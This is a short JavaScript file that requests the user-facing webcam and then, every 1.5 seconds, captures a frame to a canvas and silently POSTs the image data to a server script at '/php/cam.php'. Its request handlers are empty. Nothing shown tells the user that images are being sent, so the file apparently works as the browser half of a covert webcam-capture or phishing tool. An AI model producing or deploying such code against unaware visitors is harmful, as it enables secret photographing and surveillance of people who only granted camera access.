function post(imgdata) {
    $.ajax({
        type: 'POST',
        data: {
            img: imgdata
        },
        url: '/php/cam.php',
        dataType: 'json',
        async: false,
        success: function(result) {},
        error: function() {}
    });
};

'use strict';

const constraints = {
    audio: false,
    video: {
        facingMode: "user"
    }
};

// Access webcam
async function init() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        handleSuccess(stream);
    } catch (e) {
        alert(`navigator.getUserMedia error: ${e.toString()}`)
    }
}

// Success
function handleSuccess(stream) {
	const video = document.querySelector("video");
	const canvas = document.querySelector("canvas");

    window.stream = stream;
    video.srcObject = stream;

    var context = canvas.getContext('2d');
    setInterval(function() {
        context.drawImage(video, 0, 0, 740, 580);
        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
		post(canvasData);
    }, 1500);
}